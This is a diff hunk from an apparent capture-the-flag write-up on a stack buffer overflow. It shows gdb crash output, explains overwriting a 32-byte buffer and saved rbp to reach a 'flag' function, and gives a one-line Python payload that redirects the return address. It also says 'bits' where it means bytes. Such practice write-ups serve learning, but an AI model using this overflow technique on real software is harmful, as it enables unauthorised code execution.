@@ -119,16 +119,16 @@ so i tried checking for any other function . I found flag function
 	Legend: code, data, rodata, value
 	Stopped reason: SIGSEGV
 	0x00000000004011cd in main ()
-    ```
+    
 
 
 We have buffer 32  and we have flag function so we can overwite. thats the case if we have flag 
 function also on the main function . But here we have flag function is a different function outside 
 main function. so we need overwite the value of  $rbp   we need to add 8 more bits to our exploit.
 
-## exploit  
+ exploit  
 
-	python -c 'print "A"*40 + "\xce\x11\x40\x00\x00\x00\x00\x00"
+	python -c 'print "A"*40 + "\xce\x11\x40\x00\x00\x00\x00\x00"'
 
 
 
